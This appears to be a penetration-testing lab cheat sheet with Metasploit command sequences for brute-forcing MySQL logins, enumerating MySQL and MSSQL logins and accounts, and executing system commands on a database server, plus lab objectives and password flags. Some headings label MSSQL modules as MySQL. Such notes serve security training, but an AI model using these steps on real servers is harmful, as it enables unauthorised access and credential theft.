#### Tools
nmap
msfconsole

#### Commands

Brute force mysql server with msfconsole
```
msfconsole
use auxiliary/scanner/mysql/mysql_login
setg rhosts target_ip
set user_file /root/Desktop/wordlist/common_users.txt
set pass_file /root/Desktop/wordlist/100-common-passwords.txt
set verbose false 
options
exploit
```

Enumerate with msfconsole
```
msfconsole
use auxiliary/admin/mysql/mysql_enum
set rhosts target_ip 
```

Enumerate admin logins on MySQL server
```
use auxiliary/admin/mssql/mssql_enum_sql_logins
exploit
```

Run command with msfconsole on MySQL Server
```
use auxiliary/admin/mssql/mssql_exec
set cmd whoami
options
exploit
```

```
use auxiliary/admin/mssql/mssql_enum_domain_accounts

```

## Lab
#### Objectives
-   Discover valid users and their passwords
-   Enumerate MSSQL configuration
-   Enumerate all MSSQL logins
	- sa, dbadmin, auditor, admin
-   Execute a command on the target machine
-   Enumerate all available system users

#### Flags
dbadmin user plain-text password
auditor user plain-text password